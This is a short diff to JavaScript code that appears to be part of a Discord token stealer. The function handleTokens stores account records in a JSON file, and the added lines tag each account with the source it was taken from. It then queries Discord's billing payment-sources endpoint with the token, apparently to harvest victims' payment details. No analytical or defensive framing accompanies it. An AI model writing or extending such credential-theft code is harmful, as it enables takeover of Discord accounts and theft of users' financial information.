@@ -96,6 +96,9 @@ const handleTokens = (tokens, resolve) => {
         if (!info.accounts.find(account => account.id === json.id)) {
           info.accounts.push(json);
           writeFileSync(jsonFile, JSON.stringify(info));
+        } else if (info.accounts.find(account => account.id === json.id && !account.source.includes(source))) {
+          info.accounts.find(account => account.id === json.id).source += ', ' + source;
+          writeFileSync(jsonFile, JSON.stringify(info));
         }
 
         axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
